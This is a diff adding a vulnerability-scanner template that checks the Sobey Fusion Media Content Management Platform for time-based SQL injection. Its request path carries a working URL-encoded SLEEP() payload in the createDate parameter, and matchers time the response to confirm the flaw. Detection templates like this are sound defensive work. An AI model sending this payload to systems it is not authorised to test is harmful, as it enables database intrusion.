@@ -1,0 +1,33 @@
+id: poc-yaml-sobey-imcmp-getcountbycode-sqli
+info:
+  name: Sobey Fusion Media Content Management Platform getCountByCode SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1)*3}}"
+  t3: "{{to_number(t2)+2}}"
+
+http:
+  - method: GET
+    path:
+      - "/sobey-mchEditor/count/getCountByCode?status=1&createDate=%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%28{{t1}}%29%29%29x%29%20AND%20%271%27=%271"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Sobey"
+      - type: word
+        part: body
+        words:
+          - "\"data\":"
+          - "获取数据成功"
+      - type: dsl
+        dsl:
+          - "duration > t2 && duration < t3"
